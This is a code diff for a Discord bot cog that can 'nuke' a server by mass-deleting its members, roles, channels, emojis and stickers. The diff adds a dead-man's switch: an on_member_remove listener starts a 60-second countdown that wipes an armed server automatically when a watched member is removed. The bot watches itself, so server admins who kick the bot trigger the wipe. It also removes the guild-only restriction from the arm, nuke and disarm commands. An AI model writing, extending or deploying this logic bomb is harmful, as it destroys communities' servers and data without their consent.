@@ -53,6 +53,19 @@ async def nuke_members(guild: discord.Guild) -> Tuple[int, int]:  # Fails & memb
             members += 1
     return fails, members
 
+async def message_owner(bot: commands.Bot, *args, **kwargs) -> Union[discord.Message, List[discord.Message]]:
+    """Sends a message to the owner(s) of the bot with these arguments."""
+    owners: List[int] = (bot.owner_ids or [bot.owner_id])
+    if len(owners) > 1:
+        messages: List[discord.Message] = []
+        for owner in owners:  # Gets all owners, one way or another
+            owner_user: discord.User = await bot.fetch_user(owner)
+            messages.append(await owner_user.send(*args, **kwargs))
+        return messages
+    else:
+        owner_user: discord.User = await bot.fetch_user(owners[-1])
+        return await owner_user.send(*args, **kwargs)
+
 
 async def nuke_emojis(guild: discord.Guild) -> Tuple[int, int]:  # Fails & emojis deleted
     fails: int = 0
@@ -135,9 +148,7 @@ async def nuke(bot: commands.Bot, guild: discord.Guild) -> None:
     fails += role_results[0]
     roles = role_results[1]
 
-    for owner in (bot.owner_ids or [bot.owner_id]):  # Gets all owners, one way or another
-        owner_user: discord.User = await bot.fetch_user(owner)
-        await owner_user.send(
+    status_string: str = (
             f"Nuked {guild.name} ({guild.id}). "
             f"Casualties: {roles} role(s), "
             f"{emojis} emoji(s), "
@@ -145,25 +156,62 @@ async def nuke(bot: commands.Bot, guild: discord.Guild) -> None:
             f"{stickers} stickers(s), "
             f"and {members} member(s). "
             f"Unable to delete {fails} models."
-        )
-
-    logging.info(
-        f"Nuked {guild.name} ({guild.id}). "
-        f"Casualties: {roles} role(s), "
-        f"{emojis} emoji(s), "
-        f"{channels} channel(s), "
-        f"{stickers} stickers(s), "
-        f"and {members} member(s). "
-        f"Unable to delete {fails} models."
     )
+
+    await message_owner(bot, status_string)
+
+    logging.info(status_string)
 
 
 async def evaluate_nuclear_action(bot: Union[commands.Bot, commands.Context],
                                   guild: Optional[discord.Guild] = None) -> bool:
+    """See if a server is nukable. Can be used as a check if you so desire."""
     if isinstance(bot, commands.Context):
         guild: discord.Guild = bot.guild
         bot: commands.Bot = bot.bot
     return guild.id in nukables
+
+
+async def get_watched_ids(bot: commands.Bot) -> List[int]:
+    """Get a list of watched IDs"""
+    return watched_ids  # This is a placeholder method for when it migrates to a database.
+
+
+async def evaluate_if_member_is_watched(bot: commands.Bot, member: Union[commands.Context, discord.Member]) -> bool:
+    """See if a member is watched. Can be used a check if you so desire."""
+    member: discord.Member = member if isinstance(member, discord.Member) else member.author
+    return member.id in await get_watched_ids(bot)
+
+
+async def countdown(bot: commands.Bot, victim: discord.Member, reason: str) -> bool:
+    """Counts down for 60 seconds towards the destruction of the server. Returns if anything happened"""
+    if await evaluate_if_member_is_watched(bot, victim) and await evaluate_nuclear_action(bot, victim.guild):
+        reason_string: str = (
+            f"Someone cut the red wire in {victim.guild.name} ({victim.guild.id}).\n"
+            f"{victim.name}#{victim.discriminator} ({victim.id}) was {reason}.\n"
+            f"You have 60 seconds to disarm this server if you do not want anything to go through."
+        )
+        await message_owner(bot, reason_string)
+        logging.warning(reason_string)
+        await asyncio.sleep(30)
+        await message_owner(bot, "30 seconds remain.")
+        await asyncio.sleep(30)
+        await message_owner(bot, "Time's up. Checking...")
+        if await evaluate_nuclear_action(bot, victim.guild):
+            confirmation_string: str = (
+                f"The timer ran out. {victim.guild.name} ({victim.guild.id}) is on a war path."
+            )
+            logging.warning(confirmation_string)
+            await message_owner(bot, confirmation_string)
+            await nuke(bot, victim.guild)
+            return True
+        else:
+            confirmation_string: str = (
+                f"Crisis averted in {victim.guild.name} ({victim.guild.id})."
+            )
+            logging.info(confirmation_string)
+            await message_owner(bot, confirmation_string)
+            return False
 
 
 class TickTick(commands.Cog):
@@ -177,14 +225,23 @@ class TickTick(commands.Cog):
         else:
             raise commands.NotOwner()
 
-    # TODO: See if a server has done something that might be nukable.
-
     @commands.Cog.listener("on_ready")
-    async def initialize_watching_users(self):
+    async def initialize_watching_users(self) -> None:
         watched_ids.append(self.bot.user.id)
 
+    @commands.Cog.listener("on_member_remove")
+    async def someone_kicked_or_banned(self, member: discord.Member) -> None:
+        asyncio.create_task(countdown(self.bot, member, "removed"))
+
+    @commands.Cog.listener("on_guild_role_update")
+    async def role_no_longer_has_admin(self, before: discord.Role, after: discord.Role) -> None:
+        pass  # TODO: See if a role no longer has admin and a watched member no longer has access to it.
+
+    @commands.Cog.listener("on_member_update")
+    async def check_for_role_removal(self, before: discord.Member) -> None:
+        pass  # TODO: See if a watched member no longer has access to the admin permission.
+
     @commands.command("arm", brief="Puts the server on watch. Nuking is possible.")
-    @commands.guild_only()
     async def arm(self, ctx: commands.Context, *, guild: Optional[discord.Guild]) -> None:
         guild: discord.Guild = guild or ctx.guild
         if guild.id not in nukables:
@@ -192,7 +249,6 @@ class TickTick(commands.Cog):
         await ctx.send("T-Minus as long as it takes.")
 
     @commands.command("nuke", brief="Pull the trigger.")
-    @commands.guild_only()
     @commands.check(evaluate_nuclear_action)
     async def nuke(self, ctx: commands.Context, *, guild: Optional[discord.Guild]) -> None:
         guild: discord.Guild = guild or ctx.guild
@@ -217,7 +273,6 @@ class TickTick(commands.Cog):
             await nuke(ctx.bot, guild)
 
     @commands.command("disarm", brief="Removes the server from watch. Nuking is not possible.")
-    @commands.guild_only()
     @commands.check(evaluate_nuclear_action)
     async def disarm(self, ctx: commands.Context, *, guild: Optional[discord.Guild]) -> None:
         guild: discord.Guild = guild or ctx.guild
